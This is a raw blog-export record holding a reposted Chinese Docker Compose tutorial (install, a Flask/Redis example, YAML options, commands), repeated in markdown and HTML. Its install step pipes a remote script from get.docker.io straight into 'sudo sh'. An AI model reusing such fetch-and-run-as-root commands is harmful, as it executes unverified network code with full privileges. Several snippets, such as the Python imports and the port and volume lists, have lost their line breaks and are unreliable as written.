d833e0b23482\nStep 1 : ADD . /code\n ---> 1c04b1b15808\nRemoving intermediate container 9dab91b4410d\nStep 2 : WORKDIR /code\n ---> Running in f495a62feac9\n ---> ffea89a7b090\nAttaching to myapp_redis_1, myapp_web_1\n......\nredis_1 | [1] 17 May 10:42:38.147 * The server is now ready to accept connections on port 6379\nweb_1   |  * Running on http://0.0.0.0:5000/ (Press CTRL+C to quit)\nweb_1   |  * Restarting with stat\n```\n## 3. Yaml文件参考\n\n在上面的yaml文件中，我们可以看到compose文件的基本结构。首先是定义一个服务名，下面是yaml服务中的一些选项条目：\n\nimage:镜像的ID\n\nbuild:直接从pwd的Dockerfile来build，而非通过image选项来pull\n\nlinks：连接到那些容器。每个占一行，格式为SERVICE[:ALIAS],例如 – db[:database]\n\nexternal_links：连接到该compose.yaml文件之外的容器中，比如是提供共享或者通用服务的容器服务。格式同links\n\ncommand：替换默认的command命令\n\nports: 导出端口。格式可以是：\n\n```\nports:-\"3000\"-\"8000:8000\"-\"127.0.0.1:8001:8001\"\n```\nexpose：导出端口，但不映射到宿主机的端口上。它仅对links的容器开放。格式直接指定端口号即可。\n\nvolumes：加载路径作为卷，可以指定只读模式。\n```\nvolumes:-/var/lib/mysql\n - cache/:/tmp/cache\n -~/configs:/etc/configs/:ro\n ```\n volumes_from：加载其他容器或者服务的所有卷\n```\nenvironment:- RACK_ENV=development\n  - SESSION_SECRET\n```\nenv_file：从一个文件中导入环境变量，文件的格式为RACK_ENV=development\n\nextends:扩展另一个服务，可以覆盖其中的一些选项。一个sample如下：\n```\ncommon.yml\nwebapp:\n  build:./webapp\n  environment:- DEBUG=false- SEND_EMAILS=false\ndevelopment.yml\nweb:extends:\n    file: common.yml\n    service: webapp\n  ports:-\"8000:8000\"\n  links:- db\n  environment:- DEBUG=true\ndb:\n  image: postgres\n```\nnet：容器的网络模式，可以为”bridge”, “none”, “container:[name or id]”, “host”中的一个。\ndns：可以设置一个或多个自定义的DNS地址。\n\ndns_search:可以设置一个或多个DNS的扫描域。\n\n其他的working_dir, entrypoint, user, hostname, domainname, mem_limit, privileged, restart, stdin_open, tty, cpu_shares，和docker run命令是一样的，这些命令都是单行的命令。例如：\n\n```\ncpu_shares:73\nworking_dir:/code\nentrypoint: /code/entrypoint.sh\nuser: postgresql\nhostname: foo\ndomainname: foo.com\nmem_limit:1000000000\nprivileged:true\nrestart: always\nstdin_open:true\ntty:true\n```\n## 4. docker-compose常用命令\n\n在第二节中的docker-compose up，这两个容器都是在前台运行的。我们可以指定-d命令以daemon的方式启动容器。除此之外，docker-compose还支持下面参数：\n\n--verbose：输出详细信息\n\n-f 制定一个非docker-compose.yml命名的yaml文件\n\n-p 设置一个项目名称（默认是directory名）\n\ndocker-compose的动作包括：\n\nbuild：构建服务\n\nkill -s SIGINT：给服务发送特定的信号。\n\nlogs：输出日志\n\nport：输出绑定的端口\n\nps：输出运行的容器\n\npull：pull服务的image\n\nrm：删除停止的容器\n\nrun: 运行某个服务，例如docker-compose run web\npython manage.py shell\n\nstart：运行某个服务中存在的容器。\n\nstop:停止某个服务中存在的容器。\n\nup：create + run + attach容器到服务。\n\nscale：设置服务运行的容器数量。例如：docker-compose scale web=2 worker=3\n\n>转载:http://debugo.com/docker-compose\n                                   \n","slug":"Docker-Compose—简化复杂应用的利器","published":1,"updated":"2017-03-08T19:05:11.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj2mm9xnn000a5es5qy01vdnd","content":"<p>Compose是用于定义和运行复杂Docker应用的工具。你可以在一个文件中定义一个多容器的应用，然后使用一条命令来启动你的应用，然后所有相关的操作都会被自动完成。<br><a id=\"more\"></a> </p>\n<h2 id=\"1-安装Docker和Compose\"><a href=\"#1-安装Docker和Compose\" class=\"headerlink\" title=\"1. 安装Docker和Compose\"></a>1. 安装Docker和Compose</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\"># 当前最新的Docker是1.6.2，Compose为1.2.0</span></div><div class=\"line\">curl <span class=\"_\">-s</span> https://get.docker.io/ubuntu/ | sudo sh</div><div class=\"line\">sudo apt-get update</div><div class=\"line\">sudo apt-get install lxc-docker</div><div class=\"line\"><span class=\"comment\"># 参考http://docs.docker.com/compose/install/#install-compose</span></div><div class=\"line\">curl -L https://github.com/docker/compose/releases/download/1.2.0/docker-compose-`uname <span class=\"_\">-s</span>`-`uname -m` &amp;gt; /usr/<span class=\"built_in\">local</span>/bin/docker-compose</div><div class=\"line\">chmod +x /usr/<span class=\"built_in\">local</span>/bin/docker-compose</div></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">### 上面这个方法真的慢出翔，可以通过Python pip安装。</span></div><div class=\"line\"></div><div class=\"line\">apt-get install python-pip python-dev</div><div class=\"line\">pip install -U docker-compose</div></pre></td></tr></table></figure>\n<p>当前最新的Docker是1.6.2，Compose为1.2.0<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo apt-get update</div><div class=\"line\">sudo apt-get install lxc-docker</div></pre></td></tr></table></figure></p>\n<p>参考 <a href=\"http://docs.docker.com/compose/install/#install-compose\" target=\"_blank\" rel=\"external\">http://docs.docker.com/compose/install/#install-compose</a><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">curl -L https://github.com/docker/compose/releases/download/1.2.0/docker-compose-uname <span class=\"_\">-s</span>-uname -m &gt; /usr/<span class=\"built_in\">local</span>/bin/docker-compose curl -L https://github.com/docker/compose/releases/download/1.2.0/docker-compose-uname <span class=\"_\">-s</span>-uname -m &gt; /usr/<span class=\"built_in\">local</span>/bin/docker-compose</div><div class=\"line\"></div><div class=\"line\">chmod +x /usr/<span class=\"built_in\">local</span>/bin/docker-compose</div><div class=\"line\"><span class=\"comment\">### 上面这个方法真的慢出翔，可以通过Python pip安装。</span></div><div class=\"line\">apt-get install python-pip python-dev</div><div class=\"line\">pip install -U docker-compose</div></pre></td></tr></table></figure></p>\n<p>这样compose就安装好了，查看一下compose的版本信息：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">chmod +x /usr/<span class=\"built_in\">local</span>/bin/docker-compose</div><div class=\"line\">docker-compose -version</div><div class=\"line\">docker-compose 1.2.0</div></pre></td></tr></table></figure>\n<h2 id=\"2-使用Compose\"><a href=\"#2-使用Compose\" class=\"headerlink\" title=\"2. 使用Compose\"></a>2. 使用Compose</h2><p>使用Compose只需要简单的三个步骤：</p>\n<p>首先，使用Dockerfile来定义你的应用环境：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">FROM python:2.7</div><div class=\"line\">ADD ./code</div><div class=\"line\">WORKDIR /code</div><div class=\"line\">RUN pip install -r requirements.txt</div></pre></td></tr></table></figure></p>\n<p>其中，requirements.txt中的内容包括：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">flask</div><div class=\"line\">redis</div></pre></td></tr></table></figure>\n<p>再用Python写一个简单的app.py<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">from</span> flask importFlaskfrom redis importRedisimport os</div><div class=\"line\">app =Flask(__name__)</div><div class=\"line\">redis =Redis(host=<span class=\"string\">'redis'</span>, port=<span class=\"number\">6379</span>)@app.route(<span class=\"string\">'/'</span>)<span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">hello</span><span class=\"params\">()</span>:</span></div><div class=\"line\">    redis.incr(<span class=\"string\">'hits'</span>)<span class=\"keyword\">return</span><span class=\"string\">'Hello World! I have been seen %s times.'</span>% redis.get(<span class=\"string\">'hits'</span>)<span class=\"keyword\">if</span> __name__ ==<span class=\"string\">\"__main__\"</span>:</div><div class=\"line\">    app.run(host=<span class=\"string\">\"0.0.0.0\"</span>, debug=<span class=\"keyword\">True</span>)</div></pre></td></tr></table></figure></p>\n<p>第二步，用一个compose.yaml来定义你的应用服务，他们可以把不同的服务生成不同的容器中组成你的应用<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\">web:</div><div class=\"line\">  build:.</div><div class=\"line\">  <span class=\"built_in\">command</span>: python app.py</div><div class=\"line\">  ports:</div><div class=\"line\">         - <span class=\"string\">\"5000:5000\"</span></div><div class=\"line\">  volumes:</div><div class=\"line\">         - .:/code</div><div class=\"line\">  links:</div><div class=\"line\">         - redis</div><div class=\"line\">redis:</div><div class=\"line\">  image: redis</div></pre></td></tr></table></figure></p>\n<p>第三步，执行<code>docker-compose up</code>来启动你的应用，它会根据compose.yaml的设置来pull/run这俩个容器，然后再启动。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div></pre></td><td class=\"code\"><pre><div class=\"line\">Creating myapp_redis_1...</div><div class=\"line\">Creating myapp_web_1...</div><div class=\"line\">Building web...</div><div class=\"line\">Step 0 : FROM python:2.7</div><div class=\"line\">2.7: Pulling from python</div><div class=\"line\">...</div><div class=\"line\">Status: Downloaded newer image <span class=\"keyword\">for</span> python:2.7</div><div class=\"line\"> ---&gt; d833e0b23482</div><div class=\"line\">Step 1 : ADD . /code</div><div class=\"line\"> ---&gt; 1c04b1b15808</div><div class=\"line\">Removing intermediate container 9dab91b4410d</div><div class=\"line\">Step 2 : WORKDIR /code</div><div class=\"line\"> ---&gt; Running <span class=\"keyword\">in</span> f495a62feac9</div><div class=\"line\"> ---&gt; ffea89a7b090</div><div class=\"line\">Attaching to myapp_redis_1, myapp_web_1</div><div class=\"line\">......</div><div class=\"line\">redis_1 | [1] 17 May 10:42:38.147 * The server is now ready to accept connections on port 6379</div><div class=\"line\">web_1   |  * Running on http://0.0.0.0:5000/ (Press CTRL+C to quit)</div><div class=\"line\">web_1   |  * Restarting with <span class=\"built_in\">stat</span></div></pre></td></tr></table></figure></p>\n<h2 id=\"3-Yaml文件参考\"><a href=\"#3-Yaml文件参考\" class=\"headerlink\" title=\"3. Yaml文件参考\"></a>3. Yaml文件参考</h2><p>在上面的yaml文件中，我们可以看到compose文件的基本结构。首先是定义一个服务名，下面是yaml服务中的一些选项条目：</p>\n<p>image:镜像的ID</p>\n<p>build:直接从pwd的Dockerfile来build，而非通过image选项来pull</p>\n<p>links：连接到那些容器。每个占一行，格式为SERVICE[:ALIAS],例如 – db[:database]</p>\n<p>external_links：连接到该compose.yaml文件之外的容器中，比如是提供共享或者通用服务的容器服务。格式同links</p>\n<p>command：替换默认的command命令</p>\n<p>ports: 导出端口。格式可以是：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">ports:-&quot;3000&quot;-&quot;8000:8000&quot;-&quot;127.0.0.1:8001:8001&quot;</div></pre></td></tr></table></figure>\n<p>expose：导出端口，但不映射到宿主机的端口上。它仅对links的容器开放。格式直接指定端口号即可。</p>\n<p>volumes：加载路径作为卷，可以指定只读模式。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">volumes:-/var/lib/mysql</div><div class=\"line\"> - cache/:/tmp/cache</div><div class=\"line\"> -~/configs:/etc/configs/:ro</div></pre></td></tr></table></figure></p>\n<p> volumes_from：加载其他容器或者服务的所有卷<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">environment:- RACK_ENV=development</div><div class=\"line\">  - SESSION_SECRET</div></pre></td></tr></table></figure></p>\n<p>env_file：从一个文件中导入环境变量，文件的格式为RACK_ENV=development</p>\n<p>extends:扩展另一个服务，可以覆盖其中的一些选项。一个sample如下：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div></pre></td><td class=\"code\"><pre><div class=\"line\">common.yml</div><div class=\"line\">webapp:</div><div class=\"line\">  build:./webapp</div><div class=\"line\">  environment:- DEBUG=false- SEND_EMAILS=false</div><div class=\"line\">development.yml</div><div class=\"line\">web:extends:</div><div class=\"line\">    file: common.yml</div><div class=\"line\">    service: webapp</div><div class=\"line\">  ports:-&quot;8000:8000&quot;</div><div class=\"line\">  links:- db</div><div class=\"line\">  environment:- DEBUG=true</div><div class=\"line\">db:</div><div class=\"line\">  image: postgres</div></pre></td></tr></table></figure></p>\n<p>net：容器的网络模式，可以为”bridge”, “none”, “container:[name or id]”, “host”中的一个。<br>dns：可以设置一个或多个自定义的DNS地址。</p>\n<p>dns_search:可以设置一个或多个DNS的扫描域。</p>\n<p>其他的working_dir, entrypoint, user, hostname, domainname, mem_limit, privileged, restart, stdin_open, tty, cpu_shares，和docker run命令是一样的，这些命令都是单行的命令。例如：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\">cpu_shares:73</div><div class=\"line\">working_dir:/code</div><div class=\"line\">entrypoint: /code/entrypoint.sh</div><div class=\"line\">user: postgresql</div><div class=\"line\">hostname: foo</div><div class=\"line\">domainname: foo.com</div><div class=\"line\">mem_limit:1000000000</div><div class=\"line\">privileged:true</div><div class=\"line\">restart: always</div><div class=\"line\">stdin_open:true</div><div class=\"line\">tty:true</div></pre></td></tr></table></figure>\n<h2 id=\"4-docker-compose常用命令\"><a href=\"#4-docker-compose常用命令\" class=\"headerlink\" title=\"4. docker-compose常用命令\"></a>4. docker-compose常用命令</h2><p>在第二节中的docker-compose up，这两个容器都是在前台运行的。我们可以指定-d命令以daemon的方式启动容器。除此之外，docker-compose还支持下面参数：</p>\n<p>–verbose：输出详细信息</p>\n<p>-f 制定一个非docker-compose.yml命名的yaml文件</p>\n<p>-p 设置一个项目名称（默认是directory名）</p>\n<p>docker-compose的动作包括：</p>\n<p>build：构建服务</p>\n<p>kill -s SIGINT：给服务发送特定的信号。</p>\n<p>logs：输出日志</p>\n<p>port：输出绑定的端口</p>\n<p>ps：输出运行的容器</p>\n<p>pull：pull服务的image</p>\n<p>rm：删除停止的容器</p>\n<p>run: 运行某个服务，例如docker-compose run web<br>python manage.py shell</p>\n<p>start：运行某个服务中存在的容器。</p>\n<p>stop:停止某个服务中存在的容器。</p>\n<p>up：create + run + attach容器到服务。</p>\n<p>scale：设置服务运行的容器数量。例如：docker-compose scale web=2 worker=3</p>\n<blockquote>\n<p>转载:<a href=\"http://debugo.com/docker-compose\" target=\"_blank\" rel=\"external\">http://debugo.com/docker-compose</a></p>\n</blockquote>\n","excerpt":"<p>Compose是用于定义和运行复杂Docker应用的工具。你可以在一个文件中定义一个多容器的应用，然后使用一条命令来启动你的应用，然后所有相关的操作都会被自动完成。<br>","more":"</p>\n<h2 id=\"1-安装Docker和Compose\"><a href=\"#1-安装Docker和Compose\" class=\"headerlink\" title=\"1. 安装Docker和Compose\"></a>1. 安装Docker和Compose</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\"># 当前最新的Docker是1.6.2，Compose为1.2.0</span></div><div class=\"line\">curl <span class=\"_\">-s</span> https://get.docker.io/ubuntu/ | sudo sh</div><div class=\"line\">sudo apt-get update</div><div class=\"line\">sudo apt-get install lxc-docker</div><div class=\"line\"><span class=\"comment\"># 参考http://docs.docker.com/compose/install/#install-compose</span></div><div class=\"line\">curl -L https://github.com/docker/compose/releases/download/1.2.0/docker-compose-`uname <span class=\"_\">-s</span>`-`uname -m` &amp;gt; /usr/<span class=\"built_in\">local</span>/bin/docker-compose</div><div class=\"line\">chmod +x /usr/<span class=\"built_in\">local</span>/bin/docker-compose</div></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">### 上面这个方法真的慢出翔，可以通过Python pip安装。</span></div><div class=\"line\"></div><div class=\"line\">apt-get install python-pip python-dev</div><div class=\"line\">pip install -U docker-compose</div></pre></td></tr></table></figure>\n<p>当前最新的Docker是1.6.2，Compose为1.2.0<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo apt-get update</div><div class=\"line\">sudo apt-get install lxc-docker</div></pre></td></tr></table></figure></p>\n<p>参考 <a href=\"http://docs.docker.com/compose/install/#install-compose\">http://docs.docker.com/compose/install/#install-compose</a><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">curl -L https://github.com/docker/compose/releases/download/1.2.0/docker-compose-uname <span class=\"_\">-s</span>-uname -m &gt; /usr/<span class=\"built_in\">local</span>/bin/docker-compose curl -L https://github.com/docker/compose/releases/download/1.2.0/docker-compose-uname <span class=\"_\">-s</span>-uname -m &gt; /usr/<span class=\"built_in\">local</span>/bin/docker-compose</div><div class=\"line\"></div><div class=\"line\">chmod +x /usr/<span class=\"built_in\">local</span>/bin/docker-compose</div><div class=\"line\"><span class=\"comment\">### 上面这个方法真的慢出翔，可以通过Python pip安装。</span></div><div class=\"line\">apt-get install python-pip python-dev</div><div class=\"line\">pip install -U docker-compose</div></pre></td></tr></table></figure></p>\n<p>这样compose就安装好了，查看一下compose的版本信息：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">chmod +x /usr/<span class=\"built_in\">local</span>/bin/docker-compose</div><div class=\"line\">docker-compose -version</div><div class=\"line\">docker-compose 1.2.0</div></pre></td></tr></table></figure>\n<h2 id=\"2-使用Compose\"><a href=\"#2-使用Compose\" class=\"headerlink\" title=\"2. 使用Compose\"></a>2. 使用Compose</h2><p>使用Compose只需要简单的三个步骤：</p>\n<p>首先，使用Dockerfile来定义你的应用环境：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">FROM python:2.7</div><div class=\"line\">ADD ./code</div><div class=\"line\">WORKDIR /code</div><div class=\"line\">RUN pip install -r requirements.txt</div></pre></td></tr></table></figure></p>\n<p>其中，requirements.txt中的内容包括：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">flask</div><div class=\"line\">redis</div></pre></td></tr></table></figure>\n<p>再用Python写一个简单的app.py<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">from</span> flask importFlaskfrom redis importRedisimport os</div><div class=\"line\">app =Flask(__name__)</div><div class=\"line\">redis =Redis(host=<span class=\"string\">'redis'</span>, port=<span class=\"number\">6379</span>)@app.route(<span class=\"string\">'/'</span>)<span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">hello</span><span class=\"params\">()</span>:</span></div><div class=\"line\">    redis.incr(<span class=\"string\">'hits'</span>)<span class=\"keyword\">return</span><span class=\"string\">'Hello World! I have been seen %s times.'</span>% redis.get(<span class=\"string\">'hits'</span>)<span class=\"keyword\">if</span> __name__ ==<span class=\"string\">\"__main__\"</span>:</div><div class=\"line\">    app.run(host=<span class=\"string\">\"0.0.0.0\"</span>, debug=<span class=\"keyword\">True</span>)</div></pre></td></tr></table></figure></p>\n<p>第二步，用一个compose.yaml来定义你的应用服务，他们可以把不同的服务生成不同的容器中组成你的应用<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\">web:</div><div class=\"line\">  build:.</div><div class=\"line\">  <span class=\"built_in\">command</span>: python app.py</div><div class=\"line\">  ports:</div><div class=\"line\">         - <span class=\"string\">\"5000:5000\"</span></div><div class=\"line\">  volumes:</div><div class=\"line\">         - .:/code</div><div class=\"line\">  links:</div><div class=\"line\">         - redis</div><div class=\"line\">redis:</div><div class=\"line\">  image: redis</div></pre></td></tr></table></figure></p>\n<p>第三步，执行<code>docker-compose up</code>来启动你的应用，它会根据compose.yaml的设置来pull/run这俩个容器，然后再启动。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div></pre></td><td class=\"code\"><pre><div class=\"line\">Creating myapp_redis_1...</div><div class=\"line\">Creating myapp_web_1...</div><div class=\"line\">Building web...</div><div class=\"line\">Step 0 : FROM python:2.7</div><div class=\"line\">2.7: Pulling from python</div><div class=\"line\">...</div><div class=\"line\">Status: Downloaded newer image <span class=\"keyword\">for</span> python:2.7</div><div class=\"line\"> ---&gt; d833e0b23482</div><div class=\"line\">Step 1 : ADD . /code</div><div class=\"line\"> ---&gt; 1c04b1b15808</div><div class=\"line\">Removing intermediate container 9dab91b4410d</div><div class=\"line\">Step 2 : WORKDIR /code</div><div class=\"line\"> ---&gt; Running <span class=\"keyword\">in</span> f495a62feac9</div><div class=\"line\"> ---&gt; ffea89a7b090</div><div class=\"line\">Attaching to myapp_redis_1, myapp_web_1</div><div class=\"line\">......</div><div class=\"line\">redis_1 | [1] 17 May 10:42:38.147 * The server is now ready to accept connections on port 6379</div><div class=\"line\">web_1   |  * Running on http://0.0.0.0:5000/ (Press CTRL+C to quit)</div><div class=\"line\">web_1   |  * Restarting with <span class=\"built_in\">stat</span></div></pre></td></tr></table></figure></p>\n<h2 id=\"3-Yaml文件参考\"><a href=\"#3-Yaml文件参考\" class=\"headerlink\" title=\"3. Yaml文件参考\"></a>3. Yaml文件参考</h2><p>在上面的yaml文件中，我们可以看到compose文件的基本结构。首先是定义一个服务名，下面是yaml服务中的一些选项条目：</p>\n<p>image:镜像的ID</p>\n<p>build:直接从pwd的Dockerfile来build，而非通过image选项来pull</p>\n<p>links：连接到那些容器。每个占一行，格式为SERVICE[:ALIAS],例如 – db[:database]</p>\n<p>external_links：连接到该compose.yaml文件之外的容器中，比如是提供共享或者通用服务的容器服务。格式同links</p>\n<p>command：替换默认的command命令</p>\n<p>ports: 导出端口。格式可以是：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">ports:-&quot;3000&quot;-&quot;8000:8000&quot;-&quot;127.0.0.1:8001:8001&quot;</div></pre></td></tr></table></figure>\n<p>expose：导出端口，但不映射到宿主机的端口上。它仅对links的容器开放。格式直接指定端口号即可。</p>\n<p>volumes：加载路径作为卷，可以指定只读模式。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">volumes:-/var/lib/mysql</div><div class=\"line\"> - cache/:/tmp/cache</div><div class=\"line\"> -~/configs:/etc/configs/:ro</div></pre></td></tr></table></figure></p>\n<p> volumes_from：加载其他容器或者服务的所有卷<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">environment:- RACK_ENV=development</div><div class=\"line\">  - SESSION_SECRET</div></pre></td></tr></table></figure></p>\n<p>env_file：从一个文件中导入环境变量，文件的格式为RACK_ENV=development</p>\n<p>extends:扩展另一个服务，可以覆盖其中的一些选项。一个sample如下：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div></pre></td><td class=\"code\"><pre><div class=\"line\">common.yml</div><div class=\"line\">webapp:</div><div class=\"line\">  build:./webapp</div><div class=\"line\">  environment:- DEBUG=false- SEND_EMAILS=false</div><div class=\"line\">development.yml</div><div class=\"line\">web:extends:</div><div class=\"line\">    file: common.yml</div><div class=\"line\">    service: webapp</div><div class=\"line\">  ports:-&quot;8000:8000&quot;</div><div class=\"line\">  links:- db</div><div class=\"line\">  environment:- DEBUG=true</div><div class=\"line\">db:</div><div class=\"line\">  image: postgres</div></pre></td></tr></table></figure></p>\n<p>net：容器的网络模式，可以为”bridge”, “none”, “container:[name or id]”, “host”中的一个。<br>dns：可以设置一个或多个自定义的DNS地址。</p>\n<p>dns_search:可以设置一个或多个DNS的扫描域。</p>\n<p>其他的working_dir, entrypoint, user, hostname, domainname, mem_limit, privileged, restart, stdin_open, tty, cpu_shares，和docker run命令是一样的，这些命令都是单行的命令。例如：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\">cpu_shares:73</div><div class=\"line\">working_dir:/code</div><div class=\"line\">entrypoint: /code/entrypoint.sh</div><div class=\"line\">user: postgresql</div><div class=\"line\">hostname: foo</div><div class=\"line\">domainname: foo.com</div><div class=\"line\">mem_limit:1000000000</div><div class=\"line\">privileged:true</div><div class=\"line\">restart: always</div><div class=\"line\">stdin_open:true</div><div class=\"line\">tty:true</div></pre></td></tr></table></figure>\n<h2 id=\"4-docker-compose常用命令\"><a href=\"#4-docker-compose常用命令\" class=\"headerlink\" title=\"4. docker-compose常用命令\"></a>4. docker-compose常用命令</h2><p>在第二节中的docker-compose up，这两个容器都是在前台运行的。我们可以指定-d命令以daemon的方式启动容器。除此之外，docker-compose还支持下面参数：</p>\n<p>–verbose：输出详细信息</p>\n<p>-f 制定一个非docker-compose.yml命名的yaml文件</p>\n<p>-p 